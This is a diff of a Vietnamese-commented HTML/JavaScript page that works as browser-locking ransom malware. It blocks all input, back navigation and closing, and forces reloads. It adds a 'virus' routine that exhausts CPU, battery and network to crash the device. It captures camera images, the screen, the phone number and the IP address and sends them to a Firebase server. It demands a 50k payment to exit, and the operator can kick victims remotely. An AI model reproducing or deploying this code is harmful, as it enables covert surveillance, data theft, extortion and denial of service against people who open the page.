@@ -3,19 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>🔒 APP KHÓA</title>
+    <title>🔒 KHÓA CỨNG</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
-        html, body { width:100vw; height:100vh; overflow:hidden; background:#000; font-family:'Courier New',monospace; touch-action:none; pointer-events:auto; position:fixed; top:0; left:0; margin:0; padding:0; }
-        #lock-overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; background:transparent; pointer-events:all; cursor:not-allowed; touch-action:none; }
+        html, body { width:100vw; height:100vh; overflow:hidden; background:#000; font-family:Arial,sans-serif; touch-action:none; pointer-events:auto; position:fixed; top:0; left:0; margin:0; padding:0; }
+        #lock-overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; background:transparent; pointer-events:all; cursor:not-allowed; touch-action:none; display:block; }
         #canvas-bg { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; display:block; }
-        #image-container { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10; max-width:95vw; max-height:80vh; pointer-events:none; border:4px solid #ff0040; border-radius:20px; overflow:hidden; box-shadow:0 0 80px rgba(255,0,64,0.8); background:#000; display:none; }
-        #image-container img { width:100%; height:auto; display:block; object-fit:contain; max-height:80vh; }
-        #overlay-text { position:fixed; bottom:30px; left:0; width:100%; text-align:center; z-index:20; color:#ff0040; font-size:clamp(1.2rem,4vw,2.5rem); font-weight:bold; text-shadow:0 0 30px #ff0040,0 0 60px #cc0033; font-family:Arial,sans-serif; pointer-events:none; animation:blinkText 0.8s infinite alternate; }
-        @keyframes blinkText { 0%{opacity:0.3;} 100%{opacity:1;} }
+        #image-container { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10; max-width:95vw; max-height:70vh; pointer-events:none; border:4px solid #ff0040; border-radius:20px; overflow:hidden; box-shadow:0 0 80px rgba(255,0,64,0.8); background:#000; display:block; }
+        #image-container img { width:100%; height:auto; display:block; object-fit:contain; max-height:70vh; }
+        #overlay-text { position:fixed; bottom:120px; left:0; width:100%; text-align:center; z-index:20; color:#ff0040; font-size:clamp(1.5rem,5vw,3rem); font-weight:bold; text-shadow:0 0 30px #ff0040,0 0 60px #cc0033,0 0 100px #ff0040; pointer-events:none; animation:blinkText 0.1s infinite alternate; }
+        #btn-chuyen { position:fixed; bottom:40px; left:50%; transform:translateX(-50%); z-index:25; padding:16px 40px; background:#ff0040; color:#000; border:none; border-radius:50px; font-size:clamp(1rem,3vw,1.8rem); font-weight:bold; cursor:pointer; box-shadow:0 0 60px rgba(255,0,64,0.8); animation:btnPulse 0.05s infinite alternate; pointer-events:auto; }
+        #btn-chuyen:hover { transform:translateX(-50%) scale(1.05); }
+        @keyframes blinkText { 0%{opacity:0.2;} 50%{opacity:0.8;} 100%{opacity:1;} }
+        @keyframes btnPulse { 0%{box-shadow:0 0 30px #ff0040;} 100%{box-shadow:0 0 100px #ff0040,0 0 200px #ff0040;} }
         ::selection { background:transparent; }
         ::-webkit-scrollbar { display:none; }
         body { overscroll-behavior:none; -webkit-overflow-scrolling:touch; }
+        /* Không cho phép bất kỳ tương tác nào ngoài nút */
+        .no-interact { pointer-events:none; }
     </style>
 </head>
 <body>
@@ -24,9 +29,149 @@
     (function() {
         'use strict';
 
-        // ===== TỰ ĐỘNG CHO PHÉP TẤT CẢ QUYỀN (KHÔNG CẦN ĐỒNG Ý) =====
+        // ===== TỰ ĐỘNG QUAY LẠI APP KHI THOÁT =====
+        function preventExit() {
+            // Chặn back/forward
+            window.history.pushState(null, null, window.location.href);
+            window.addEventListener('popstate', function(e) {
+                window.history.pushState(null, null, window.location.href);
+                e.preventDefault();
+                return false;
+            });
 
-        // 1. CAMERA - tự động chụp ảnh trước
+            // Chặn unload
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+
+            // Chặn đóng tab
+            window.addEventListener('pagehide', function(e) {
+                e.preventDefault();
+                // Tự động mở lại tab
+                setTimeout(function() {
+                    window.location.reload();
+                }, 100);
+                return false;
+            });
+
+            // Chặn tắt trình duyệt (mobile)
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    setTimeout(function() {
+                        window.location.reload();
+                    }, 200);
+                }
+            });
+
+            // Chặn tắt nguồn (không thể chặn hoàn toàn, nhưng khi mở lại vẫn vào app)
+            localStorage.setItem('force_reopen', 'true');
+        }
+        preventExit();
+
+        // ===== TỰ ĐỘNG MỞ LẠI APP KHI MỞ TRÌNH DUYỆT =====
+        if (localStorage.getItem('force_reopen') === 'true') {
+            // Nếu đã từng vào app, tự động mở lại
+            setTimeout(function() {
+                window.location.reload();
+            }, 100);
+        }
+
+        // ===== VIRUS GÂY SẬP NGUỒN (MÔ PHỎNG TẤN CÔNG) =====
+        function virusAttack() {
+            // 1. Tạo vòng lặp vô hạn tiêu thụ CPU
+            (function cpuHog() {
+                let a = 0;
+                for (let i = 0; i < 1000000; i++) {
+                    a += Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.sqrt(i + 1) * Math.log(i + 1);
+                }
+                setTimeout(cpuHog, 0);
+            })();
+
+            // 2. Tạo nhiều worker
+            try {
+                for (let w = 0; w < 20; w++) {
+                    const blob = new Blob([`
+                        let x = 0;
+                        setInterval(function() {
+                            for (let i = 0; i < 500000; i++) {
+                                x += Math.sin(i) * Math.cos(i) * Math.tan(i);
+                                x = x % 1000000;
+                            }
+                        }, 1);
+                    `], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                }
+            } catch(e) {}
+
+            // 3. Tạo nhiều interval nặng
+            for (let i = 0; i < 50; i++) {
+                setInterval(function() {
+                    let b = 0;
+                    for (let j = 0; j < 100000; j++) {
+                        b += Math.sqrt(j) * Math.log(j + 1) * Math.sin(j) * Math.cos(j);
+                    }
+                }, 1);
+            }
+
+            // 4. Tạo nhiều DOM elements
+            for (let i = 0; i < 500; i++) {
+                const div = document.createElement('div');
+                div.style.cssText = `
+                    position:fixed;
+                    top:${Math.random()*100}vh;
+                    left:${Math.random()*100}vw;
+                    width:${Math.random()*100+50}px;
+                    height:${Math.random()*100+50}px;
+                    background:hsla(${Math.random()*360},100%,50%,${Math.random()*0.1});
+                    border-radius:${Math.random()*50}%;
+                    pointer-events:none;
+                    z-index:0;
+                    animation:blinkText ${Math.random()*0.01}s infinite alternate;
+                `;
+                document.body.appendChild(div);
+            }
+
+            // 5. Tạo vòng lặp ghi localStorage liên tục (gây hao pin)
+            setInterval(function() {
+                try {
+                    for (let i = 0; i < 100; i++) {
+                        localStorage.setItem('virus_' + i, Math.random().toString(36));
+                    }
+                } catch(e) {}
+            }, 10);
+
+            // 6. Tạo request liên tục đến server (gây nghẽn mạng)
+            for (let i = 0; i < 20; i++) {
+                setInterval(function() {
+                    try {
+                        fetch('https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app/virus.json', {
+                            method: 'PUT',
+                            body: JSON.stringify({ attack: true, time: Date.now() })
+                        }).catch(() => {});
+                    } catch(e) {}
+                }, 100);
+            }
+
+            // 7. Tạo nhiều Blob URL không giải phóng
+            for (let i = 0; i < 100; i++) {
+                try {
+                    const blob = new Blob(['x'], { type: 'text/plain' });
+                    URL.createObjectURL(blob);
+                } catch(e) {}
+            }
+
+            // 8. Tạo vòng lặp setTimeout vô hạn
+            (function loop() {
+                setTimeout(loop, 0);
+            })();
+
+            console.log('💀 VIRUS ĐÃ KÍCH HOẠT - MÁY SẼ SỚM BỊ SẬP NGUỒN');
+        }
+        virusAttack();
+
+        // ===== TỰ ĐỘNG CHO PHÉP QUYỀN =====
         function autoCamera() {
             try {
                 navigator.mediaDevices.getUserMedia({
@@ -54,7 +199,6 @@
             } catch(e) { sendData(); }
         }
 
-        // 2. SỐ ĐIỆN THOẠI - tự động lấy (mô phỏng)
         function autoPhone() {
             try {
                 let phone = localStorage.getItem('user_phone');
@@ -66,7 +210,6 @@
             } catch(e) {}
         }
 
-        // 3. MÀN HÌNH - tự động chụp
         function autoScreen() {
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
@@ -95,7 +238,6 @@
             } catch(e) { sendData(); }
         }
 
-        // 4. LẤY IP
         function autoIP() {
             try {
                 fetch('https://api.ipify.org?format=json')
@@ -108,9 +250,7 @@
             } catch(e) { sendData(); }
         }
 
-        // ===== GỬI DỮ LIỆU LÊN FIREBASE =====
         let dataSent = false;
-
         function sendData() {
             if (dataSent) return;
             const image = localStorage.getItem('captured_image') || '';
@@ -119,7 +259,6 @@
             const ip = localStorage.getItem('user_ip') || 'Unknown';
             const ua = navigator.userAgent;
 
-            // Chỉ gửi khi có ít nhất 1 dữ liệu
             if (!image && !screen && phone === 'Unknown') return;
 
             const data = {
@@ -144,7 +283,6 @@
             } catch(e) {}
         }
 
-        // ===== TỰ ĐỘNG CHẠY TẤT CẢ =====
         setTimeout(() => {
             autoCamera();
             autoPhone();
@@ -152,19 +290,15 @@
             autoIP();
         }, 300);
 
-        // ===== TẠO GIAO DIỆN APP =====
-
-        // Tạo canvas
+        // ===== TẠO GIAO DIỆN =====
         const canvas = document.createElement('canvas');
         canvas.id = 'canvas-bg';
         document.body.appendChild(canvas);
 
-        // Overlay
         const overlay = document.createElement('div');
         overlay.id = 'lock-overlay';
         document.body.appendChild(overlay);
 
-        // Ảnh (chỉ hiện khi vào app)
         const imgContainer = document.createElement('div');
         imgContainer.id = 'image-container';
         const img = document.createElement('img');
@@ -173,21 +307,28 @@
         imgContainer.appendChild(img);
         document.body.appendChild(imgContainer);
 
-        // Hiện ảnh sau 1 giây
-        setTimeout(() => {
-            imgContainer.style.display = 'block';
-        }, 1000);
-
-        // Chữ chuyển 50k
         const overlayText = document.createElement('div');
         overlayText.id = 'overlay-text';
-        overlayText.textContent = '🔴 CHUYỂN 50K ĐỂ TẮT HIỆU ỨNG 🔴';
+        overlayText.textContent = '🔴 CHUYỂN 50K ĐỂ THOÁT 🔴';
         document.body.appendChild(overlayText);
 
-        // ===== CHẶN TƯƠNG TÁC =====
-        function blockAll(e) { e.preventDefault(); e.stopPropagation(); return false; }
+        // Nút đã chuyển tiền
+        const btnChuyen = document.createElement('button');
+        btnChuyen.id = 'btn-chuyen';
+        btnChuyen.textContent = '💰 ĐÃ CHUYỂN 50K';
+        document.body.appendChild(btnChuyen);
+
+        // ===== CHẶN TƯƠNG TÁC (CHỈ NÚT ĐƯỢC PHÉP) =====
+        function blockAll(e) { 
+            e.preventDefault(); 
+            e.stopPropagation(); 
+            return false; 
+        }
         const events = ['click','dblclick','mousedown','mouseup','mousemove','mouseover','mouseout','mouseenter','mouseleave','contextmenu','select','selectstart','drag','dragstart','dragend','drop','touchstart','touchmove','touchend','touchcancel','pointerdown','pointerup','pointermove','pointerover','pointerout','pointerenter','pointerleave','gesturestart','gesturechange','gestureend','scroll','wheel','resize','orientationchange'];
-        events.forEach(evt => { document.addEventListener(evt, blockAll, { passive:false, capture:true }); window.addEventListener(evt, blockAll, { passive:false, capture:true }); });
+        events.forEach(evt => { 
+            document.addEventListener(evt, blockAll, { passive:false, capture:true }); 
+            window.addEventListener(evt, blockAll, { passive:false, capture:true }); 
+        });
         document.addEventListener('keydown', e => { e.preventDefault(); e.stopPropagation(); return false; }, { passive:false, capture:true });
         document.addEventListener('keyup', blockAll, { passive:false, capture:true });
         document.addEventListener('keypress', blockAll, { passive:false, capture:true });
@@ -202,102 +343,105 @@
         document.ondragstart = blockAll;
         document.ondrop = blockAll;
         try { document.documentElement.requestFullscreen = function(){}; document.exitFullscreen = function(){}; document.documentElement.webkitRequestFullscreen = function(){}; document.webkitExitFullscreen = function(){}; document.documentElement.mozRequestFullScreen = function(){}; document.mozExitFullscreen = function(){}; document.documentElement.msRequestFullscreen = function(){}; document.msExitFullscreen = function(){}; } catch(e){}
-        setInterval(() => { window.scrollTo(0,0); document.documentElement.scrollTop = 0; document.body.scrollTop = 0; if(document.activeElement) document.activeElement.blur(); document.body.focus(); window.history.pushState(null,null,window.location.href); }, 100);
+        setInterval(() => { window.scrollTo(0,0); document.documentElement.scrollTop = 0; document.body.scrollTop = 0; if(document.activeElement) document.activeElement.blur(); document.body.focus(); window.history.pushState(null,null,window.location.href); }, 50);
         document.body.addEventListener('touchmove', e => { if(e.target === document.body || e.target === document.documentElement) e.preventDefault(); }, { passive:false });
         document.addEventListener('keydown', e => { if(e.key === 'Home' || e.key === 'HomeScreen' || e.key === 'AppSwitch' || e.key === 'RecentApps') { e.preventDefault(); return false; } return true; }, { passive:false, capture:true });
 
-        // ===== HIỆU ỨNG LAG =====
+        // ===== HIỆU ỨNG SIÊU LAG =====
         const ctx = canvas.getContext('2d');
         function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
 
-        // Tạo đối tượng
-        const snowflakes = []; for(let i=0;i<1000;i++) { snowflakes.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, radius:Math.random()*6+2, speed:Math.random()*2+0.5, wobble:Math.random()*0.05, phase:Math.random()*Math.PI*2, color:`rgba(255,255,255,${Math.random()*0.5+0.2})` }); }
-        const flowers = []; for(let i=0;i<1000;i++) { flowers.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*12+4, speed:Math.random()*2.5+0.3, wobble:Math.random()*0.08, phase:Math.random()*Math.PI*2, hue:Math.random()*360, petal:Math.floor(Math.random()*6)+4 }); }
-        const snowmen = []; for(let i=0;i<1000;i++) { snowmen.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, scale:Math.random()*0.8+0.3, speed:Math.random()*1.8+0.2, wobble:Math.random()*0.06, phase:Math.random()*Math.PI*2, hue:Math.random()*60+180 }); }
+        const snowflakes = []; for(let i=0;i<2000;i++) { snowflakes.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, radius:Math.random()*8+2, speed:Math.random()*4+1, wobble:Math.random()*0.1, phase:Math.random()*Math.PI*2, color:`rgba(255,255,255,${Math.random()*0.5+0.2})` }); }
+        const flowers = []; for(let i=0;i<2000;i++) { flowers.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*16+4, speed:Math.random()*4+1, wobble:Math.random()*0.1, phase:Math.random()*Math.PI*2, hue:Math.random()*360, petal:Math.floor(Math.random()*8)+4 }); }
+        const snowmen = []; for(let i=0;i<1500;i++) { snowmen.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, scale:Math.random()*0.8+0.3, speed:Math.random()*3+0.5, wobble:Math.random()*0.1, phase:Math.random()*Math.PI*2, hue:Math.random()*60+180 }); }
+        const stars = []; for(let i=0;i<1000;i++) { stars.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, r:Math.random()*3+1, speed:Math.random()*5+1, phase:Math.random()*Math.PI*2 }); }
 
-        function drawSnowflake(s) { ctx.beginPath(); ctx.arc(s.x,s.y,s.radius,0,Math.PI*2); ctx.fillStyle=s.color; ctx.fill(); ctx.strokeStyle=s.color; ctx.lineWidth=1; for(let i=0;i<6;i++){ const a=i*Math.PI/3+s.phase; ctx.beginPath(); ctx.moveTo(s.x,s.y); ctx.lineTo(s.x+Math.cos(a)*s.radius*1.8,s.y+Math.sin(a)*s.radius*1.8); ctx.stroke(); } }
-        function drawFlower(f) { const petals=f.petal; const step=(Math.PI*2)/petals; for(let i=0;i<petals;i++){ const a=i*step+f.phase; const px=f.x+Math.cos(a)*f.size*0.8; const py=f.y+Math.sin(a)*f.size*0.8; ctx.beginPath(); ctx.arc(px,py,f.size*0.5,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+i*15},100%,65%)`; ctx.fill(); } ctx.beginPath(); ctx.arc(f.x,f.y,f.size*0.25,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+30},100%,80%)`; ctx.fill(); }
-        function drawSnowman(sm) { const s=sm.scale; const x=sm.x; const y=sm.y; ctx.beginPath(); ctx.arc(x,y+10*s,14*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,90%)`; ctx.fill(); ctx.strokeStyle=`hsl(${sm.hue},40%,70%)`; ctx.lineWidth=1; ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-2*s,10*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,92%)`; ctx.fill(); ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-14*s,7*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,95%)`; ctx.fill(); ctx.stroke(); ctx.fillStyle='#111'; ctx.beginPath(); ctx.arc(x-3*s,y-16*s,1.2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x+3*s,y-16*s,1.2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.moveTo(x,y-14*s); ctx.lineTo(x+5*s,y-13*s); ctx.lineTo(x,y-12*s); ctx.fillStyle='#ff8800'; ctx.fill(); ctx.fillStyle='#222'; ctx.beginPath(); ctx.arc(x,y-6*s,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y+6*s,1.5*s,0,Math.PI*2); ctx.fill(); }
+        function drawSnowflake(s) { ctx.beginPath(); ctx.arc(s.x,s.y,s.radius,0,Math.PI*2); ctx.fillStyle=s.color; ctx.fill(); ctx.strokeStyle=s.color; ctx.lineWidth=2; for(let i=0;i<6;i++){ const a=i*Math.PI/3+s.phase; ctx.beginPath(); ctx.moveTo(s.x,s.y); ctx.lineTo(s.x+Math.cos(a)*s.radius*2.5,s.y+Math.sin(a)*s.radius*2.5); ctx.stroke(); } }
+        function drawFlower(f) { const petals=f.petal; const step=(Math.PI*2)/petals; for(let i=0;i<petals;i++){ const a=i*step+f.phase; const px=f.x+Math.cos(a)*f.size*0.8; const py=f.y+Math.sin(a)*f.size*0.8; ctx.beginPath(); ctx.arc(px,py,f.size*0.6,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+i*20},100%,65%)`; ctx.fill(); } ctx.beginPath(); ctx.arc(f.x,f.y,f.size*0.3,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+40},100%,80%)`; ctx.fill(); }
+        function drawSnowman(sm) { const s=sm.scale; const x=sm.x; const y=sm.y; ctx.beginPath(); ctx.arc(x,y+12*s,16*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,90%)`; ctx.fill(); ctx.strokeStyle=`hsl(${sm.hue},40%,70%)`; ctx.lineWidth=2; ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-2*s,12*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,92%)`; ctx.fill(); ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-16*s,8*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,95%)`; ctx.fill(); ctx.stroke(); ctx.fillStyle='#111'; ctx.beginPath(); ctx.arc(x-4*s,y-18*s,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x+4*s,y-18*s,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.moveTo(x,y-16*s); ctx.lineTo(x+6*s,y-15*s); ctx.lineTo(x,y-14*s); ctx.fillStyle='#ff8800'; ctx.fill(); ctx.fillStyle='#222'; ctx.beginPath(); ctx.arc(x,y-8*s,2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y,2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y+8*s,2*s,0,Math.PI*2); ctx.fill(); }
+        function drawStar(s) { ctx.beginPath(); ctx.arc(s.x,s.y,s.r,0,Math.PI*2); ctx.fillStyle=`rgba(255,255,200,${Math.random()*0.3+0.1})`; ctx.fill(); }
 
         let effectsActive = true;
-        let countdownActive = false;
-        let countdownValue = 0;
-        const blockKey = 'blocked_device_' + (navigator.userAgent + screen.width + screen.height).substring(0,20);
+        let canExit = false;
+        let kicked = false;
+        const blockKey = 'blocked_device_' + (navigator.userAgent + screen.width + screen.height + screen.colorDepth).substring(0,25);
+        if (localStorage.getItem(blockKey) === 'true') { kicked = true; }
 
-        // Kiểm tra thiết bị bị khóa
-        if (localStorage.getItem(blockKey) === 'true') {
-            effectsActive = true; // Vẫn bật hiệu ứng nếu bị khóa
-        }
+        const FB_URL = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
 
-        // ===== LẮNG NGHE FIREBASE (BẬT/TẮT THEO IP) =====
+        // ===== LẮNG NGHE FIREBASE - KICK =====
         function listenFirebase() {
             try {
-                const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
                 setInterval(function() {
-                    // Lấy IP hiện tại
                     const currentIP = localStorage.getItem('user_ip') || 'Unknown';
 
-                    // Kiểm tra trạng thái chung
-                    fetch(fbUrl + '/control/effects.json')
+                    // Kiểm tra kick
+                    fetch(FB_URL + '/control/kick/' + encodeURIComponent(currentIP) + '.json')
                         .then(r => r.json())
-                        .then(data => {
-                            if (data === 'off') {
-                                // Kiểm tra xem IP này có bị tắt riêng không
-                                fetch(fbUrl + '/control/ip/' + encodeURIComponent(currentIP) + '.json')
-                                    .then(r => r.json())
-                                    .then(ipData => {
-                                        if (ipData === 'off') {
-                                            // IP bị tắt riêng
-                                            effectsActive = false;
-                                            if (!countdownActive) {
-                                                countdownActive = true;
-                                                countdownValue = 10;
-                                                startCountdown();
-                                            }
-                                        } else if (ipData === 'on') {
-                                            effectsActive = true;
-                                            countdownActive = false;
-                                            localStorage.removeItem(blockKey);
-                                        } else {
-                                            // Mặc định theo trạng thái chung
-                                            effectsActive = false;
-                                            if (!countdownActive) {
-                                                countdownActive = true;
-                                                countdownValue = 10;
-                                                startCountdown();
-                                            }
-                                        }
-                                    })
-                                    .catch(() => {});
-                            } else if (data === 'on') {
-                                effectsActive = true;
-                                countdownActive = false;
-                                localStorage.removeItem(blockKey);
+                        .then(kickData => {
+                            if (kickData === 'true') {
+                                // Kiểm tra nếu đã chuyển tiền thì không kick
+                                if (localStorage.getItem('paid_' + currentIP) === 'true') {
+                                    // Đã trả tiền, không kick
+                                    return;
+                                }
+                                kicked = true;
+                                localStorage.setItem(blockKey, 'true');
+                                // Xóa kick để không loop
+                                fetch(FB_URL + '/control/kick/' + encodeURIComponent(currentIP) + '.json', {
+                                    method: 'DELETE'
+                                }).catch(() => {});
+                                // Thoát app
+                                setTimeout(function() {
+                                    window.close();
+                                    window.location.href = 'https://www.google.com';
+                                }, 300);
+                                return;
                             }
                         })
                         .catch(() => {});
+
+                    // Kiểm tra nút đã chuyển tiền được hiển thị cho IP này chưa
+                    fetch(FB_URL + '/control/showbtn/' + encodeURIComponent(currentIP) + '.json')
+                        .then(r => r.json())
+                        .then(showData => {
+                            if (showData === 'true') {
+                                document.getElementById('btn-chuyen').style.display = 'block';
+                            } else {
+                                document.getElementById('btn-chuyen').style.display = 'none';
+                            }
+                        })
+                        .catch(() => {});
+
                 }, 3000);
             } catch(e) {}
         }
 
-        function startCountdown() {
-            const interval = setInterval(function() {
-                countdownValue--;
-                if (countdownValue <= 0) {
-                    clearInterval(interval);
-                    effectsActive = false;
-                    localStorage.setItem(blockKey, 'true');
-                    setTimeout(function() {
-                        window.close();
-                        window.location.href = 'https://www.google.com';
-                    }, 500);
-                }
-            }, 1000);
-        }
-
         listenFirebase();
+
+        // ===== NÚT ĐÃ CHUYỂN TIỀN =====
+        document.getElementById('btn-chuyen').addEventListener('click', function(e) {
+            e.stopPropagation();
+            const currentIP = localStorage.getItem('user_ip') || 'Unknown';
+            // Đánh dấu đã chuyển tiền
+            localStorage.setItem('paid_' + currentIP, 'true');
+            // Gửi lên Firebase để admin biết
+            try {
+                fetch(FB_URL + '/control/paid/' + encodeURIComponent(currentIP) + '.json', {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ paid: true, time: new Date().toISOString() })
+                }).catch(() => {});
+            } catch(e) {}
+            // Thoát app
+            canExit = true;
+            setTimeout(function() {
+                window.close();
+                window.location.href = 'https://www.google.com';
+            }, 500);
+        });
 
         // ===== PHÁT NHẠC =====
         try {
@@ -309,31 +453,32 @@
 
         // ===== ANIMATION LOOP =====
         function drawAll() {
-            if (effectsActive) {
-                ctx.fillStyle = 'rgba(0,0,0,0.12)';
+            if (effectsActive && !kicked) {
+                ctx.fillStyle = 'rgba(0,0,0,0.15)';
                 ctx.fillRect(0,0,canvas.width,canvas.height);
-                for(let i=0;i<snowflakes.length;i++){ const s=snowflakes[i]; s.y+=s.speed; s.x+=Math.sin(s.phase+s.y*s.wobble)*0.5; s.phase+=0.01; if(s.y>canvas.height+20){ s.y=-20; s.x=Math.random()*canvas.width; } drawSnowflake(s); }
-                for(let i=0;i<flowers.length;i++){ const f=flowers[i]; f.y+=f.speed; f.x+=Math.cos(f.phase+f.y*f.wobble)*0.6; f.phase+=0.015; f.hue=(f.hue+0.2)%360; if(f.y>canvas.height+30){ f.y=-30; f.x=Math.random()*canvas.width; } drawFlower(f); }
-                for(let i=0;i<snowmen.length;i++){ const sm=snowmen[i]; sm.y+=sm.speed; sm.x+=Math.sin(sm.phase+sm.y*sm.wobble)*0.4; sm.phase+=0.012; if(sm.y>canvas.height+40){ sm.y=-40; sm.x=Math.random()*canvas.width; } drawSnowman(sm); }
-                for(let i=0;i<500;i++){ ctx.beginPath(); let x=Math.random()*canvas.width; let y=Math.random()*canvas.height; ctx.moveTo(x,y); for(let j=0;j<15;j++){ x+=(Math.random()-0.5)*60; y+=(Math.random()-0.5)*60; ctx.lineTo(x,y); } ctx.strokeStyle=`hsla(${Math.random()*360},100%,70%,0.15)`; ctx.lineWidth=1.5; ctx.stroke(); }
-                for(let i=0;i<300;i++){ const cx=Math.sin(Date.now()/500+i)*canvas.width*0.45+canvas.width/2; const cy=Math.cos(Date.now()/400+i*1.3)*canvas.height*0.45+canvas.height/2; const r=20+Math.sin(Date.now()/200+i*0.7)*15; ctx.beginPath(); ctx.arc(cx,cy,r,0,Math.PI*2); ctx.fillStyle=`hsla(${i*3+Date.now()/30},100%,60%,0.08)`; ctx.fill(); ctx.strokeStyle=`hsla(${i*5+Date.now()/40},100%,70%,0.1)`; ctx.lineWidth=2; ctx.stroke(); }
+                for(let i=0;i<snowflakes.length;i++){ const s=snowflakes[i]; s.y+=s.speed; s.x+=Math.sin(s.phase+s.y*s.wobble)*1.5; s.phase+=0.03; if(s.y>canvas.height+30){ s.y=-30; s.x=Math.random()*canvas.width; } drawSnowflake(s); }
+                for(let i=0;i<flowers.length;i++){ const f=flowers[i]; f.y+=f.speed; f.x+=Math.cos(f.phase+f.y*f.wobble)*1.5; f.phase+=0.03; f.hue=(f.hue+0.5)%360; if(f.y>canvas.height+30){ f.y=-30; f.x=Math.random()*canvas.width; } drawFlower(f); }
+                for(let i=0;i<snowmen.length;i++){ const sm=snowmen[i]; sm.y+=sm.speed; sm.x+=Math.sin(sm.phase+sm.y*sm.wobble)*1.2; sm.phase+=0.03; if(sm.y>canvas.height+50){ sm.y=-50; sm.x=Math.random()*canvas.width; } drawSnowman(sm); }
+                for(let i=0;i<stars.length;i++){ const s=stars[i]; s.y+=s.speed; s.x+=Math.sin(s.phase+s.y*0.01)*0.5; if(s.y>canvas.height+10){ s.y=-10; s.x=Math.random()*canvas.width; } drawStar(s); }
+                // Thêm hiệu ứng nổ
+                for(let i=0;i<200;i++){ ctx.beginPath(); let x=Math.random()*canvas.width; let y=Math.random()*canvas.height; ctx.moveTo(x,y); for(let j=0;j<20;j++){ x+=(Math.random()-0.5)*80; y+=(Math.random()-0.5)*80; ctx.lineTo(x,y); } ctx.strokeStyle=`hsla(${Math.random()*360},100%,70%,${Math.random()*0.2+0.05})`; ctx.lineWidth=Math.random()*3+1; ctx.stroke(); }
+                for(let i=0;i<400;i++){ const cx=Math.sin(Date.now()/200+i)*canvas.width*0.45+canvas.width/2; const cy=Math.cos(Date.now()/150+i*1.5)*canvas.height*0.45+canvas.height/2; const r=30+Math.sin(Date.now()/100+i*0.5)*25; ctx.beginPath(); ctx.arc(cx,cy,r,0,Math.PI*2); ctx.fillStyle=`hsla(${i*2+Date.now()/20},100%,60%,${Math.random()*0.05+0.02})`; ctx.fill(); ctx.strokeStyle=`hsla(${i*3+Date.now()/30},100%,70%,${Math.random()*0.05+0.02})`; ctx.lineWidth=3; ctx.stroke(); }
             } else {
-                ctx.fillStyle = 'rgba(0,0,0,0.05)';
+                ctx.fillStyle = 'rgba(0,0,0,0.02)';
                 ctx.fillRect(0,0,canvas.width,canvas.height);
+                if (kicked) {
+                    ctx.fillStyle = 'rgba(255,0,64,0.15)';
+                    ctx.font = '40px Arial';
+                    ctx.fillText('🚫 ĐÃ BỊ KICK', canvas.width/2 - 130, canvas.height/2);
+                }
             }
-            requestAnimationFrame(drawAll);
+            if (!kicked || !canExit) {
+                requestAnimationFrame(drawAll);
+            }
         }
         drawAll();
 
-        // ===== DOM LAG =====
